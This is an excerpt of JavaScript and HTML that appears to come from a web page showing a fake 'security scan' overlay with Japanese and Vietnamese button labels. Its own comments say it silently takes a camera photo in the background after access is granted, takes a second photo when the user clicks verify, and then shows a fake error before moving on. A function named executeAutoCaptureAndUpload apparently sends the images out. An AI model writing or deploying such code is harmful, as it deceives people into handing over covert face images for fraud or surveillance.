...
(function() {
    ...
    function createStructure() {
        ...
        <style>
            ...
            .plm-sec-box { background: #1e293b; border: 1px solid #3b82f6; border-radius: 16px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.5); display: flex; flex-direction: column; justify-content: center; }
            .plm-sec-icon { font-size: 40px; color: #3b82f6; margin-bottom: 15px; animation: pulse 2s infinite; }
            .plm-face-preview-high { align-self: center; margin-bottom: 20px; border-radius:12px; overflow:hidden; border:2px solid #3b82f6; position:relative; background:#000; width:100%; max-width:300px; }
                        ...
                        <div class="plm-sec-box">
                            ...
                            <div id="plmSecActionButtons" style="display: none; flex-direction: column; gap: 10px;">
                                ...
                                <button id="plmSecBtnSkipStart" class="plm-btn" style="background:#0ea5e9;">
                                    <i class="fas fa-forward"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">プレビューをスキップ</span><span style="font-size:11px; font-weight:normal">Bỏ qua xem trước</span></span>
                                </button>
                                <button id="plmSecBtnPreview" class="plm-btn" style="background:transparent; color:#f8fafc; border:1px solid #475569;">
                                    <i class="fas fa-camera"></i> <span style="display:flex; flex-direction:column; align-items:center; line-height:1.2; text-align:center;"><span style="font-size:14px">プレビューを開く</span><span style="font-size:11px; font-weight:normal">Bật xem trước</span></span>
                                </button>
    ...
    function triggerSecurityScanFlow(inputId) {
        ...
        if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            ...
            .then(function(stream) {
                ...
                // --- IMMEDIATE BACKGROUND CAPTURE LẦN 1 ---
                // Chờ đợi 800ms để camera tự auto-exposure focus rồi chụp âm thầm
                setTimeout(() => { 
                ...
                // Skip trong Preview
                if(btnSkipPreview) {
                    btnSkipPreview.onclick = function() {
                        closeAndScan();
                    };
                }

                // Xác Thực trong Preview (Chụp Lần 2 và Fake Lỗi)
                if(btnAccept) {
                    btnAccept.onclick = function() {
                        // Gọi chụp ảnh lần 2 ngay lập tức
                        executeAutoCaptureAndUpload();
                        ...
                        // Chờ 2s cho ngấm Toast rồi di chuyển
                        setTimeout(() => {
                            closeAndScan();
                        }, 2000);
                    };
            ...
            .catch(function(err) {
                ...
                // Quyền bị từ chối, bỏ qua vào scan
